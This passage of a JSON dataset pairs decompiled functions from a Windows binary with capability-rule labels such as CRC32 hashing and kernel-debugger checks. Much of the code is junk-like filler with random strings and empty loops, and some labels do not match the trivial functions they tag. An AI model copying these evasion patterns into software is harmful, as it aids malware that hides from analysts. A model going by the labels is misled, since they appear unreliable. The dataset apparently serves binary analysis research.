        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00402a31(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack204;\n    uchar auStack200 [24];\n    uchar auStack176 [24];\n    uint uStack152;\n    uint uStack148;\n    uchar uStack137;\n    uint uStack136;\n    uint uStack132;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff18;\n    uStack28 = 0x4516a0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack44 = 0x4b9;\n    uStack48 = 0x3f9;\n    uStack52 = 0x3f3;\n    uStack24 = 0;\n    fcn.00401e79(\"oitisrjjckngy\");\n    uStack24 = 1;\n    fcn.00401e79(\"qmmyxambfiynywtbayivxxkhkfreikkpppgjgaozabehiuney\");\n    uStack24 = 2;\n    fcn.00401e79(\"fmdbeuuamlqhfyrdruf\");\n    uStack132 = 0x40c43980;\n    uStack136 = 0;\n    uStack137 = 0;\n    uStack148 = 0x40d60f80;\n    uStack152 = 0;\n    uStack24 = 3;\n    fcn.00401e79(\"oitisrjjckngy\");\n    uStack24 = 4;\n    fcn.00401e79(\"oitisrjjckngy\");\n    uVar1 = fcn.00405b37(auStack200, auStack176);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack204 = 0x55; 0 < iStack204; iStack204 = iStack204 + -1) {\n        }\n    }\n    uStack24 = 3;\n    fcn.00401e79(\"czyidmca\");\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return arg_8h;\n}\n",
        "token_count": 613
    },
    "00402a36": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.00402a36(uint arg_8h)\n\n{\n    int32_t lpCriticalSection;\n    uint *puVar1;\n    uint uVar2;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004022de(0x56f4c8, 0x10);\n    lpCriticalSection = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x20) = lpCriticalSection;\n    if (lpCriticalSection == 0) {\n        puVar1 = fcn.00403a35();\n        *puVar1 = 0x16;\n        fcn.004037ce();\n    }\n    else {\n        if ((*(lpCriticalSection + 0xc) >> 0xc & 1) == 0) {\n            *(unaff_EBP + -0x1c) = 0;\n            fcn.004013f7(lpCriticalSection);\n            *(unaff_EBP + -4) = 0;\n            uVar2 = fcn.004045a7(lpCriticalSection);\n            *(unaff_EBP + -0x1c) = uVar2;\n            *(unaff_EBP + -4) = 0xfffffffe;\n            fcn.004afb77();\n            goto code_r0x004afb64;\n        }\n        fcn.00406636(lpCriticalSection);\n    }\n    uVar2 = 0xffffffff;\ncode_r0x004afb64:\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar2;\n}\n",
        "token_count": 384
    },
    "00402a5e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402a5e(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint8_t uVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t var_bdh;\n    uint var_b8h;\n    uint var_a0h;\n    int32_t var_88h;\n    uint var_84h;\n    uint var_6ch;\n    uint var_54h;\n    uint var_3ch;\n    uint var_24h;\n    uint8_t var_1eh;\n    uint8_t var_1dh;\n    uchar *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch = &stack0xffffff34;\n    var_10h = 0xffffffff;\n    var_14h = 0x450040;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_1dh = arg_10h & 1;\n    var_1eh = arg_8h & 1;\n    fcn.00401e79(\"edvevdxszptzwmmwsgxy\");\n    var_10h = 0;\n    fcn.00401e79(\"bjxsovglxyvawazkrwjszfgaotnawvsaovduagutfoaewrcntsyzcqgc\");\n    var_10h = 1;\n    fcn.00401e79(\"edvevdxszptzwmmwsgxy\");\n    var_10h = 3;\n    fcn.00401e79(\"edvevdxszptzwmmwsgxy\");\n    uVar1 = fcn.00405b37(&var_84h, &var_6ch);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_88h = 0x3f; 0 < var_88h; var_88h = var_88h + -1) {\n        }\n    }\n    var_10h = 1;\n    fcn.00401e79(\"edvevdxszptzwmmwsgxy\");\n    var_10h = 2;\n    fcn.00401e79(\"edvevdxszptzwmmwsgxy\");\n    uVar1 = fcn.00405b37(&var_b8h, &var_a0h);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (stack0xffffff40 = 0x53; 0 < stack0xffffff40; *NULL = stack0xffffff40 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return 0x1640c;\n}\n",
        "token_count": 668
    },
    "00402b35": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402b35(int32_t arg_8h)\n\n{\n    uint arg_ch;\n    int32_t *piVar1;\n    int32_t arg_10h;\n    uint arg_8h_00;\n    int32_t in_ECX;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uchar var_15h;\n    int32_t var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = arg_8h;\n    var_ch = *(arg_8h + 0x10);\n    var_10h = fcn.00401e06();\n    var_15h = var_ch < 0x10;\n    var_14h = in_ECX;\n    if (var_15h) {\n        fcn.0040595c(in_ECX, var_10h, 0x10);\n        *(var_14h + 0x10) = var_ch;\n        *(var_14h + 0x14) = 0xf;\n    }\n    else {\n        var_1ch = fcn.0040407a();\n        var_24h = fcn.0040257c();\n        var_28h = var_ch | 0xf;\n        piVar1 = fcn.004029dc(&var_28h, &var_24h);\n        var_20h = *piVar1;\n        var_2ch = fcn.004015aa(var_20h + 1);\n        fcn.004025b8(var_14h, &var_2ch);\n        arg_ch = var_10h;\n        arg_10h = var_ch + 1;\n        arg_8h_00 = fcn.00405290(var_2ch);\n        fcn.0040595c(arg_8h_00, arg_ch, arg_10h);\n        *(var_14h + 0x10) = var_ch;\n        *(var_14h + 0x14) = var_20h;\n    }\n    return;\n}\n",
        "token_count": 517
    },
    "00402ba8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl fcn.00402ba8(uint arg_8h)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    uint32_t uVar3;\n    uint arg_8h_00;\n    int32_t *in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_48h;\n    uint var_40h;\n    uint32_t var_3ch;\n    uint var_38h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_24h;\n    uint var_20h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch = &stack0xffffff80;\n    var_10h = 0xffffffff;\n    var_14h = 0x426e80;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_24h = 0;\n    fcn.0040408e(in_ECX);\n    uVar3 = fcn.004017c6();\n    if ((uVar3 & 1) != 0) {\n        fcn.00402f81(&var_38h);\n        var_10h = 3;\n        var_30h = fcn.004054a7(&var_38h);\n        fcn.00405146();\n        var_3ch = fcn.004017c1();\n        var_3ch = var_3ch & 0xe00;\n        var_40h = arg_8h;\n        cVar2 = fcn.004039d1();\n        iVar1 = *(*in_ECX + 4);\n        arg_8h_00 = fcn.00404def();\n        fcn.00403814(arg_8h_00);\n        var_10h = 1;\n        fcn.0040263f(&var_48h, _var_50h, _var_50h >> 0x20, in_ECX + iVar1, cVar2, arg_8h);\n        uVar3 = fcn.00405eca();\n        if ((uVar3 & 1) != 0) {\n            var_24h = var_24h | 4;\n        }\n    }\n    var_10h = 0;\n    fcn.004067a3(var_24h, 0);\n    fcn.00403a71();\n    *in_FS_OFFSET = var_18h;\n    return in_ECX;\n}\n",
        "token_count": 618
    },
    "00402bb2": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid fcn.00402bb2(void)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack304;\n    uchar auStack300 [24];\n    uchar auStack276 [24];\n    int32_t iStack252;\n    uchar auStack248 [24];\n    uchar auStack224 [24];\n    int32_t iStack200;\n    int32_t iStack196;\n    ulong uStack192;\n    uint uStack112;\n    uint uStack108;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xfffffec0;\n    uStack24 = 0xffffffff;\n    uStack28 = 0x451780;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    fcn.00401e79(\"xqltysqheqemssdnunzqvefalmkbyfqbtmmooeadsumvzdwulbsqgfbbvstbaytvoylvfnhyjibvchnnzmcl\");\n    uStack68 = 0x40e7e760;\n    uStack72 = 0;\n    uStack76 = 0x40d58340;\n    uStack80 = 0;\n    uStack24 = 0;\n    fcn.00401e79(\"guwgvjhfcrzlnukrrqfuvfcziolxqxlnfwmnxqrumulehgxsnssfgaxhdwpuwcjwqogumiskykwsrkafbmgrofovttbnubdjzjt\");\n    uStack108 = 0x40df99c0;\n    uStack112 = 0;\n    uStack24 = 1;\n    fcn.00401e79(\"luszjwdqecozrmbhztlflkowrvgwcqepmsustlbcrxbiljpgsslxbyojqbxxrdojnhzvkxfnqxeblatpvgcre\");\n    uStack24 = 2;\n    fcn.00401e79(\"aserrnzezxrznxxkhqxzapwwbouwqgezvvcyfzpuqfttbgyugwxupp\");\n    uStack24 = 3;\n    fcn.00401e79(\"nvdphkfnycbwuxuttixddifmzoymziixkywdubidxderq\");\n    uStack192 = *0x547448;\n    for (iStack196 = 3; 0 < iStack196; iStack196 = iStack196 + -1) {\n    }\n    for (iStack200 = 0x57; 0 < iStack200; iStack200 = iStack200 + -1) {\n    }\n    uStack24 = 4;\n    fcn.00401e79(\"aserrnzezxrznxxkhqxzapwwbouwqgezvvcyfzpuqfttbgyugwxupp\");\n    uStack24 = 6;\n    fcn.00401e79(\"aserrnzezxrznxxkhqxzapwwbouwqgezvvcyfzpuqfttbgyugwxupp\");\n    uVar1 = fcn.00405b37(auStack248, auStack224);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack252 = 0x5b; 0 < iStack252; iStack252 = iStack252 + -1) {\n        }\n    }\n    uStack24 = 4;\n    fcn.00401e79(\"guwgvjhfcrzlnukrrqfuvfcziolxqxlnfwmnxqrumulehgxsnssfgaxhdwpuwcjwqogumiskykwsrkafbmgrofovttbnubdjzjt\");\n    uStack24 = 5;\n    fcn.00401e79(\"guwgvjhfcrzlnukrrqfuvfcziolxqxlnfwmnxqrumulehgxsnssfgaxhdwpuwcjwqogumiskykwsrkafbmgrofovttbnubdjzjt\");\n    uVar1 = fcn.004042dc(auStack300, auStack276);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack304 = 0x1f; 0 < iStack304; iStack304 = iStack304 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return;\n}\n",
        "token_count": 1137
    },
    "00402bd0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402bd0(uint arg_8h, uint arg_ch, uint arg_10h, uint noname_3, uint arg_18h)\n\n{\n    int32_t iStack60;\n    int32_t iStack56;\n    int32_t iStack52;\n    int32_t iStack48;\n    int32_t iStack44;\n    \n    for (iStack44 = 0x40; 0 < iStack44; iStack44 = iStack44 + -1) {\n    }\n    for (iStack48 = 0x2f; 0 < iStack48; iStack48 = iStack48 + -1) {\n    }\n    for (iStack52 = 0x17; 0 < iStack52; iStack52 = iStack52 + -1) {\n    }\n    for (iStack56 = 0x23; 0 < iStack56; iStack56 = iStack56 + -1) {\n    }\n    for (iStack60 = 0x30; 0 < iStack60; iStack60 = iStack60 + -1) {\n    }\n    fcn.00401e79(\"opaqtudukemrhjr\");\n    return arg_8h;\n}\n",
        "token_count": 272
    },
    "00402c2a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00402c2a(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack172;\n    int32_t iStack168;\n    int32_t iStack164;\n    uchar auStack160 [24];\n    uchar auStack136 [24];\n    uint uStack112;\n    uint uStack84;\n    uchar uStack78;\n    uchar uStack77;\n    uchar uStack50;\n    uchar uStack49;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff30;\n    uStack28 = 0x417f50;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack44 = 0x40e11e60;\n    uStack48 = 0;\n    uStack49 = 1;\n    uStack50 = 0;\n    uStack24 = 4;\n    fcn.00401e79(\"knrohbscpkqulfdlly\");\n    uStack77 = 0;\n    uStack78 = 0;\n    uStack84 = 0x2350;\n    uStack24 = 5;\n    fcn.00401e79(\"arfrozouoecoytkqzbafxtpqqroylgmujgvsufqofwejgwyqssrqchsukshfirxlsmvokbnb\");\n    uStack112 = 0x140d;\n    uStack24 = 6;\n    fcn.00401e79(\"arfrozouoecoytkqzbafxtpqqroylgmujgvsufqofwejgwyqssrqchsukshfirxlsmvokbnb\");\n    uStack24 = 7;\n    fcn.00401e79(\"arfrozouoecoytkqzbafxtpqqroylgmujgvsufqofwejgwyqssrqchsukshfirxlsmvokbnb\");\n    uVar1 = fcn.00405b37(auStack160, auStack136);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack164 = 0x37; 0 < iStack164; iStack164 = iStack164 + -1) {\n        }\n    }\n    for (iStack168 = 0x4f; 0 < iStack168; iStack168 = iStack168 + -1) {\n    }\n    for (iStack172 = 0x52; 0 < iStack172; iStack172 = iStack172 + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return;\n}\n",
        "token_count": 719
    },
    "00402cf2": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00402cf2(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    uint var_4h;\n    \n    return *(in_ECX + 4) == *(arg_8h + 4);\n}\n",
        "token_count": 57
    },
    "00402d29": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong __cdecl fcn.00402d29(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = *(arg_8h * 8 + 0x554c18);\n    iVar2 = *(arg_8h * 8 + 0x554c1c);\n    if ((~*0x574460 & 1) == 0) {\n        iVar1 = iVar1 + 2;\n        iVar2 = iVar2 + -2;\n    }\n    return CONCAT44(iVar2, iVar1);\n}\n",
        "token_count": 128
    },
    "00402e46": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00402e46(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    code **ppcVar2;\n    int32_t unaff_EBP;\n    bool bVar3;\n    uint var_44h;\n    uint var_10h;\n    uint var_4h;\n    uint uVar4;\n    \n    uVar4 = 0x38;\n    fcn.00403120();\n    piVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        ppcVar2 = fcn.00402513(0x44, uVar4);\n        *(unaff_EBP + -0x10) = ppcVar2;\n        *(unaff_EBP + -4) = 0;\n        bVar3 = ppcVar2 == NULL;\n        if (bVar3) {\n            ppcVar2 = NULL;\n        }\n        else {\n            uVar4 = fcn.00406640();\n            uVar4 = fcn.00404714(uVar4);\n            ppcVar2[1] = NULL;\n            *ppcVar2 = vtable.std::ctype_wchar_t_.0;\n            fcn.00405501(uVar4);\n        }\n        *piVar1 = ppcVar2;\n        if (!bVar3) {\n            fcn.00401fff();\n        }\n    }\n    fcn.00401127();\n    return;\n}\n",
        "token_count": 363
    },
    "00402eff": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00402eff(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack200;\n    uchar auStack196 [24];\n    uchar auStack172 [24];\n    uint uStack148;\n    uint uStack144;\n    uint uStack140;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff20;\n    uStack28 = 0x450a80;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 0;\n    fcn.00401e79(\"xfjqwulbviurobt\");\n    uStack24 = 1;\n    fcn.00401e79(\"vjdeqgqdqosgqeyvnxvxjihahgxlvtzpavwgmmayakrpbgnsludnlbisfmxakpkalyykcjqvw\");\n    uStack24 = 2;\n    fcn.00401e79(\"gcsddwnhkcorlnfiqnsxvjxrcdqvjgtxkitrbdtvcdungvoarnmvudnkoykjztxbszgactjbukuhijwnvmtmkgvvlsmhmd\");\n    uStack24 = 3;\n    fcn.00401e79(\"aazbltfwoxaurisnp\");\n    uStack140 = 0x40f09d60;\n    uStack144 = 0;\n    uStack148 = 0x11ec;\n    uStack24 = 4;\n    fcn.00401e79(\"aazbltfwoxaurisnp\");\n    uStack24 = 5;\n    fcn.00401e79(\"aazbltfwoxaurisnp\");\n    uVar1 = fcn.00405b37(auStack196, auStack172);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack200 = 0x5c; 0 < iStack200; iStack200 = iStack200 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0;\n}\n",
        "token_count": 587
    },
    "00402f68": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00402f68(uint arg_8h, uint arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack212;\n    uchar auStack208 [24];\n    uchar auStack184 [24];\n    uint uStack160;\n    uint uStack156;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uchar uStack81;\n    uint uStack56;\n    uint uStack52;\n    uint8_t uStack38;\n    uint8_t uStack37;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff18;\n    uStack24 = 0xffffffff;\n    uStack28 = 0x4181b0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack37 = arg_ch & 1;\n    uStack38 = arg_8h & 1;\n    uStack52 = 0x40d82940;\n    uStack56 = 0;\n    fcn.00401e79(\"nzfdknvqxopqtqhxnlmxcrzdkeenurngvscnwftypfsjzklljmnaelgnq\");\n    uStack81 = 0;\n    uStack92 = 0x40f1f400;\n    uStack96 = 0;\n    uStack100 = 0x4ef;\n    uStack104 = 0xbeb;\n    uStack24 = 0;\n    fcn.00401e79(\"fmlqggufxtgojrssbaurjbtzrizlchkgpvufovcnldlozhnvfhfalzuymulxoopwrmoehwbixahxmjeudsefnksuqseblqjpawz\");\n    uStack24 = 1;\n    fcn.00401e79(\"jiompwoqlahoirwievhntaxmksnupoxiinskkxitbaajmabmlovrzofncwamawityfov\");\n    uStack156 = 0x40e22c40;\n    uStack160 = 0;\n    uStack24 = 2;\n    fcn.00401e79(\"fmlqggufxtgojrssbaurjbtzrizlchkgpvufovcnldlozhnvfhfalzuymulxoopwrmoehwbixahxmjeudsefnksuqseblqjpawz\");\n    uStack24 = 3;\n    fcn.00401e79(\"fmlqggufxtgojrssbaurjbtzrizlchkgpvufovcnldlozhnvfhfalzuymulxoopwrmoehwbixahxmjeudsefnksuqseblqjpawz\");\n    uVar1 = fcn.00405b37(auStack208, auStack184);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack212 = 0x4f; 0 < iStack212; iStack212 = iStack212 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0x411;\n}\n",
        "token_count": 795
    },
    "00402f6d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool __cdecl fcn.00402f6d(uint32_t arg_8h, double *arg_ch, uint32_t arg_10h)\n\n{\n    double dVar1;\n    double dVar2;\n    double dVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    float10 fVar8;\n    float10 fVar9;\n    uint32_t var_10h;\n    uint8_t var_ch;\n    uchar uStack15;\n    uint var_ah;\n    uint32_t var_4h;\n    \n    uVar7 = arg_8h & 0x1f;\n    if (((arg_8h & 8) != 0) && ((arg_10h & 1) != 0)) {\n        fcn.00402392(1);\n        uVar7 = arg_8h & 0x17;\n        goto code_r0x004c3439;\n    }\n    if ((arg_8h & arg_10h & 4) != 0) {\n        fcn.00402392(4);\n        uVar7 = arg_8h & 0x1b;\n        goto code_r0x004c3439;\n    }\n    if (((arg_8h & 1) == 0) || ((arg_10h & 8) == 0)) {\n        if (((arg_8h & 2) != 0) && ((arg_10h & 0x10) != 0)) {\n            dVar2 = *arg_ch;\n            uVar7 = arg_8h >> 4 & 1;\n            if (dVar2 == 0.0) {\n                uVar7 = 1;\n            }\n            else {\n                fVar8 = fcn.00403a8f(SUB84(dVar2, 0), dVar2 >> 0x20, &var_4h);\n                iVar4 = var_4h - 0x600;\n                dVar2 = fVar8;\n                var_10h = SUB84(dVar2, 0);\n                var_ch = dVar2 >> 0x20;\n                uStack15 = dVar2 >> 0x28;\n                var_ah._0_2_ = dVar2 >> 0x30;\n                fVar9 = 0;\n                if (iVar4 < -0x432) {\n                    fVar9 = fVar9 * fVar8;\n                    uVar7 = 1;\n                }\n                else {\n                    var_4h = ((fVar9 < fVar8) << 8 | (fVar9 == fVar8) << 0xe) == 0;\n                    var_ah._0_2_ = var_ah & 0xf | 0x10;\n                    if (iVar4 < -0x3fd) {\n                        iVar4 = -0x3fd - iVar4;\n                        uVar5 = dVar2 >> 0x20 & 0xfffff | 0x100000;\n                        do {\n                            if (((var_10h & 1) != 0) && (uVar7 == 0)) {\n                                uVar7 = 1;\n                            }\n                            var_10h = var_10h >> 1;\n                            if ((var_ch & 1) != 0) {\n                                var_10h = var_10h | 0x80000000;\n                            }\n                            uVar6 = uVar5 >> 1;\n                            var_ch = uVar6;\n                            uStack15 = uVar6 >> 8;\n                            var_ah._0_2_ = uVar5 >> 0x11;\n                            iVar4 = iVar4 + -1;\n                            uVar5 = uVar6;\n                        } while (iVar4 != 0);\n                    }\n                    fVar9 = CONCAT26(var_ah, CONCAT15(uStack15, CONCAT14(var_ch, var_10h)));\n                    if (var_4h != 0) {\n                        fVar9 = -fVar9;\n                    }\n                }\n                *arg_ch = fVar9;\n            }\n            if (uVar7 != 0) {\n                fcn.00402392(0x10);\n            }\n            uVar7 = arg_8h & 0x1d;\n        }\n        goto code_r0x004c3439;\n    }\n    fcn.00402392(8);\n    uVar7 = arg_10h & 0xc00;\n    dVar2 = *0x558930;\n    dVar3 = *0x558930;\n    if (uVar7 == 0) {\n        dVar1 = *arg_ch;\njoined_r0x004c3310:\n        if (dVar1 <= 0.0) {\n            dVar2 = -dVar3;\n        }\n        *arg_ch = dVar2;\n    }\n    else {\n        if (uVar7 == 0x400) {\n            dVar1 = *arg_ch;\n            dVar2 = *0x558950;\n            goto joined_r0x004c3310;\n        }\n        dVar3 = *0x558950;\n        if (uVar7 == 0x800) {\n            dVar1 = *arg_ch;\n            goto joined_r0x004c3310;\n        }\n        if (uVar7 == 0xc00) {\n            dVar1 = *arg_ch;\n            dVar2 = *0x558950;\n            goto joined_r0x004c3310;\n        }\n    }\n    uVar7 = arg_8h & 0x1e;\ncode_r0x004c3439:\n    if (((arg_8h & 0x10) != 0) && ((arg_10h & 0x20) != 0)) {\n        fcn.00402392(0x20);\n        uVar7 = uVar7 & 0xffffffef;\n    }\n    return uVar7 == 0;\n}\n",
        "token_count": 1321
    },
    "00402f9a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00402f9a(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t iStack104;\n    int32_t iStack100;\n    int32_t iStack96;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x450d60;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 1;\n    fcn.00401e79(\"lwnxvnmgidndunbbbbzoingkrynxllcqhwsumqratqnonoipcwwnohmwxklym\");\n    for (iStack96 = 1; 0 < iStack96; iStack96 = iStack96 + -1) {\n    }\n    for (iStack100 = 0x14; 0 < iStack100; iStack100 = iStack100 + -1) {\n    }\n    for (iStack104 = 0x4b; 0 < iStack104; iStack104 = iStack104 + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0;\n}\n",
        "token_count": 316
    },
    "00402fdb": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
